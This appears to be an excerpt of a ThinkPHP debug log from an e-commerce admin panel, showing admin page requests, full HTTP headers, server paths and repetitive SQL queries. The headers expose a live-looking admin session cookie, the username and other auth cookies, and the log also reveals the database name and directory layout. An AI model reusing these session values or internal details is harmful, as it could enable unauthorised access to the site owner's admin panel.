+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-06'  AND `webpv` > 0 [ RunTime:0.007349s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-07'  AND `webpv` > 0 [ RunTime:0.006797s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08'  AND `webpv` > 0 [ RunTime:0.007884s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09'  AND `webpv` > 0 [ RunTime:0.006851s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-10'  AND `webpv` > 0 [ RunTime:0.007360s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-11'  AND `webpv` > 0 [ RunTime:0.006815s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-12'  AND `webpv` > 0 [ RunTime:0.006850s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-01' [ RunTime:0.006362s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-02' [ RunTime:0.006554s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-03' [ RunTime:0.006534s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-04' [ RunTime:0.006206s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-05' [ RunTime:0.006516s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-06' [ RunTime:0.006323s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-07' [ RunTime:0.006144s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-08' [ RunTime:0.006025s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-09' [ RunTime:0.006127s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-10' [ RunTime:0.006462s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-11' [ RunTime:0.006341s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-12' [ RunTime:0.006055s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-01' [ RunTime:0.006594s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-02' [ RunTime:0.006489s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-03' [ RunTime:0.006349s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-04' [ RunTime:0.006456s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-05' [ RunTime:0.006722s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-06' [ RunTime:0.006552s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-07' [ RunTime:0.006891s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-08' [ RunTime:0.006586s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-09' [ RunTime:0.006547s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-10' [ RunTime:0.006619s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-11' [ RunTime:0.006579s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-12' [ RunTime:0.006658s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-01' [ RunTime:0.006087s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-02' [ RunTime:0.006157s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-03' [ RunTime:0.006082s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-04' [ RunTime:0.006407s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-05' [ RunTime:0.006620s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-06' [ RunTime:0.006683s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-07' [ RunTime:0.006282s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-08' [ RunTime:0.006150s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-09' [ RunTime:0.006211s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-10' [ RunTime:0.006143s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-11' [ RunTime:0.006126s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-12' [ RunTime:0.006144s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.006079s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `user` [ RunTime:0.001369s ]
+[ sql ] [ SQL ] SELECT * FROM `user` WHERE  `user` = 'admin' [ RunTime:0.000379s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `seo` [ RunTime:0.001185s ]
+[ sql ] [ SQL ] SELECT * FROM `seo` WHERE  `Id` = 1 LIMIT 1 [ RunTime:0.000515s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webplug` [ RunTime:0.000817s ]
+[ sql ] [ SQL ] SELECT * FROM `webplug` WHERE  `Id` = 1 LIMIT 1 [ RunTime:0.000255s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `danyecon` [ RunTime:0.000812s ]
+[ sql ] [ SQL ] SELECT * FROM `danyecon` [ RunTime:0.000243s ]
+[ sql ] [ SQL ] SELECT * FROM `danyecon` WHERE  `class` = '备忘录' [ RunTime:0.000305s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:07:47+08:00 ] 179.134.4.167 POST aosuper.com/login.php/newsad/newsTree
+[运行时间：0.103786s] [吞吐率：9.64req/s] [内存消耗：3,810.30kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'newsTree',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '34',
+  'host' => 'aosuper.com',
+)
+[ info ] [ PARAM ] array (
+  'page' => '1',
+  'limit' => '500',
+  'formname' => 'productc',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->newsTree[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000810s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.001139s ]
+[ sql ] [ SQL ] SELECT * FROM `productc` [ RunTime:0.001933s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:07:50+08:00 ] 179.134.4.167 GET aosuper.com/login.php/admin/loadright?page=product
+[运行时间：0.467303s] [吞吐率：2.14req/s] [内存消耗：3,479.89kb] [文件加载：53]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'admin',
+    2 => 'loadright',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=0, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin',
+  'sec-fetch-dest' => 'iframe',
+  'sec-fetch-user' => '?1',
+  'sec-fetch-mode' => 'navigate',
+  'sec-fetch-site' => 'same-origin',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'sec-ch-ua-platform' => '"Windows"',
+  'sec-ch-ua-mobile' => '?0',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'page' => 'product',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Admin->loadright[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Admin.php ]
+[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/admin/view/admin/table/product.html [ array (
+  0 => 'languageObj',
+  1 => 'language',
+  2 => 'userid',
+  3 => 'user',
+  4 => 'password',
+  5 => 'ico',
+  6 => 'username',
+  7 => 'companyname',
+  8 => 'webname',
+  9 => 'domain',
+  10 => 'Address',
+  11 => 'person',
+  12 => 'mobile',
+  13 => 'qq',
+  14 => 'Introduction',
+  15 => 'tippw',
+  16 => 'weblogo',
+  17 => 'seowebname',
+  18 => 'seowebdomain',
+  19 => 'seoseotitle',
+  20 => 'seoseokey',
+  21 => 'seoseodsc',
+  22 => 'seoseoheader',
+  23 => 'jstwo',
+  24 => 'jsone',
+  25 => 'url',
+  26 => 'danyecon',
+  27 => 'num',
+  28 => 'webdomain',
+  29 => 'appid',
+  30 => 'miyao',
+  31 => 'fxtit',
+  32 => 'fxms',
+  33 => 'wxtit',
+  34 => 'Hamtime',
+  35 => 'photo',
+  36 => 'wxms',
+  37 => 'photowx',
+  38 => 'viewUV',
+  39 => 'loginnum',
+  40 => 'alluv',
+  41 => 'allmb',
+  42 => 'allorder',
+  43 => 'allkc',
+  44 => 'acviewnum',
+  45 => 'pdviewnum',
+  46 => 'notes',
+  47 => 'productc',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000863s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.001188s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.006016s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `language` [ RunTime:0.000971s ]
+[ sql ] [ SQL ] SELECT * FROM `language` ORDER BY `create_at` DESC [ RunTime:0.001567s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webpv` > 0 ORDER BY `Id` DESC [ RunTime:0.048724s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `member` [ RunTime:0.003354s ]
+[ sql ] [ SQL ] SELECT * FROM `member` ORDER BY `Id` DESC [ RunTime:0.000676s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `order` [ RunTime:0.000976s ]
+[ sql ] [ SQL ] SELECT * FROM `order` ORDER BY `Id` DESC [ RunTime:0.004677s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `news` [ RunTime:0.001066s ]
+[ sql ] [ SQL ] SELECT * FROM `news` ORDER BY `Id` DESC [ RunTime:0.000389s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-01'  AND `webpv` > 0 [ RunTime:0.006859s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-02'  AND `webpv` > 0 [ RunTime:0.006776s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-03'  AND `webpv` > 0 [ RunTime:0.006695s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-04'  AND `webpv` > 0 [ RunTime:0.007140s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-05'  AND `webpv` > 0 [ RunTime:0.007041s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-06'  AND `webpv` > 0 [ RunTime:0.006820s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-07'  AND `webpv` > 0 [ RunTime:0.006834s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08'  AND `webpv` > 0 [ RunTime:0.006626s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09'  AND `webpv` > 0 [ RunTime:0.007004s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-10'  AND `webpv` > 0 [ RunTime:0.007082s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-11'  AND `webpv` > 0 [ RunTime:0.007163s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-12'  AND `webpv` > 0 [ RunTime:0.007411s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-01' [ RunTime:0.006464s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-02' [ RunTime:0.006357s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-03' [ RunTime:0.006328s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-04' [ RunTime:0.006326s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-05' [ RunTime:0.006008s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-06' [ RunTime:0.006176s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-07' [ RunTime:0.006045s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-08' [ RunTime:0.005741s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-09' [ RunTime:0.005869s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-10' [ RunTime:0.005829s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-11' [ RunTime:0.006464s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-12' [ RunTime:0.006270s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-01' [ RunTime:0.006967s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-02' [ RunTime:0.006414s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-03' [ RunTime:0.006206s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-04' [ RunTime:0.006008s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-05' [ RunTime:0.006143s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-06' [ RunTime:0.006179s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-07' [ RunTime:0.007174s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-08' [ RunTime:0.007400s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-09' [ RunTime:0.007330s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-10' [ RunTime:0.006660s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-11' [ RunTime:0.006576s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-12' [ RunTime:0.007797s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-01' [ RunTime:0.006262s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-02' [ RunTime:0.006199s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-03' [ RunTime:0.006524s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-04' [ RunTime:0.006237s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-05' [ RunTime:0.006054s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-06' [ RunTime:0.006105s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-07' [ RunTime:0.005965s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-08' [ RunTime:0.005762s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-09' [ RunTime:0.005787s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-10' [ RunTime:0.005797s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-11' [ RunTime:0.006020s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-12' [ RunTime:0.005966s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.005724s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `user` [ RunTime:0.001135s ]
+[ sql ] [ SQL ] SELECT * FROM `user` WHERE  `user` = 'admin' [ RunTime:0.000426s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `seo` [ RunTime:0.000997s ]
+[ sql ] [ SQL ] SELECT * FROM `seo` WHERE  `Id` = 1 LIMIT 1 [ RunTime:0.000309s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webplug` [ RunTime:0.000692s ]
+[ sql ] [ SQL ] SELECT * FROM `webplug` WHERE  `Id` = 1 LIMIT 1 [ RunTime:0.000252s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `danyecon` [ RunTime:0.000624s ]
+[ sql ] [ SQL ] SELECT * FROM `danyecon` [ RunTime:0.000254s ]
+[ sql ] [ SQL ] SELECT * FROM `danyecon` WHERE  `class` = '备忘录' [ RunTime:0.000210s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.000708s ]
+[ sql ] [ SQL ] SELECT * FROM `productc` WHERE  `parent_id` = '0' [ RunTime:0.000578s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:07:54+08:00 ] 179.134.4.167 GET aosuper.com/login.php/newsad/prolist?page=1&limit=15
+[运行时间：0.042805s] [吞吐率：23.36req/s] [内存消耗：2,748.37kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'prolist',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=product',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'page' => '1',
+  'limit' => '15',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->prolist[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000740s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `product` [ RunTime:0.001277s ]
+[ sql ] [ SQL ] SELECT * FROM `product` WHERE  `status` LIKE '%%'  AND `hsz` = 'Normal' ORDER BY `Id` DESC [ RunTime:0.008455s ]
+[ sql ] [ SQL ] SELECT * FROM `product` WHERE  `status` LIKE '%%'  AND `hsz` = 'Normal' ORDER BY `Id` DESC LIMIT 0,15 [ RunTime:0.001061s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:08:02+08:00 ] 179.134.4.167 GET aosuper.com/login.php/admin/loadright?page=upproduct&formname=product
+[运行时间：0.483950s] [吞吐率：2.07req/s] [内存消耗：3,438.02kb] [文件加载：53]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'admin',
+    2 => 'loadright',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=0, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=product',
+  'sec-fetch-dest' => 'iframe',
+  'sec-fetch-user' => '?1',
+  'sec-fetch-mode' => 'navigate',
+  'sec-fetch-site' => 'same-origin',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'sec-ch-ua-platform' => '"Windows"',
+  'sec-ch-ua-mobile' => '?0',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'page' => 'upproduct',
+  'formname' => 'product',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Admin->loadright[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Admin.php ]
+[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/admin/view/admin/table_edi/upproduct.html [ array (
+  0 => 'languageObj',
+  1 => 'language',
+  2 => 'userid',
+  3 => 'user',
+  4 => 'password',
+  5 => 'ico',
+  6 => 'username',
+  7 => 'companyname',
+  8 => 'webname',
+  9 => 'domain',
+  10 => 'Address',
+  11 => 'person',
+  12 => 'mobile',
+  13 => 'qq',
+  14 => 'Introduction',
+  15 => 'tippw',
+  16 => 'weblogo',
+  17 => 'seowebname',
+  18 => 'seowebdomain',
+  19 => 'seoseotitle',
+  20 => 'seoseokey',
+  21 => 'seoseodsc',
+  22 => 'seoseoheader',
+  23 => 'jstwo',
+  24 => 'jsone',
+  25 => 'url',
+  26 => 'danyecon',
+  27 => 'num',
+  28 => 'webdomain',
+  29 => 'appid',
+  30 => 'miyao',
+  31 => 'fxtit',
+  32 => 'fxms',
+  33 => 'wxtit',
+  34 => 'Hamtime',
+  35 => 'photo',
+  36 => 'wxms',
+  37 => 'photowx',
+  38 => 'viewUV',
+  39 => 'loginnum',
+  40 => 'alluv',
+  41 => 'allmb',
+  42 => 'allorder',
+  43 => 'allkc',
+  44 => 'acviewnum',
+  45 => 'pdviewnum',
+  46 => 'notes',
+  47 => 'formname',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000717s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.001150s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.005938s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `language` [ RunTime:0.000992s ]
+[ sql ] [ SQL ] SELECT * FROM `language` ORDER BY `create_at` DESC [ RunTime:0.001426s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webpv` > 0 ORDER BY `Id` DESC [ RunTime:0.048968s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `member` [ RunTime:0.003528s ]
+[ sql ] [ SQL ] SELECT * FROM `member` ORDER BY `Id` DESC [ RunTime:0.000505s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `order` [ RunTime:0.000958s ]
+[ sql ] [ SQL ] SELECT * FROM `order` ORDER BY `Id` DESC [ RunTime:0.003746s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `news` [ RunTime:0.001509s ]
+[ sql ] [ SQL ] SELECT * FROM `news` ORDER BY `Id` DESC [ RunTime:0.000470s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-01'  AND `webpv` > 0 [ RunTime:0.006921s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-02'  AND `webpv` > 0 [ RunTime:0.007026s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-03'  AND `webpv` > 0 [ RunTime:0.007021s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-04'  AND `webpv` > 0 [ RunTime:0.007057s ]
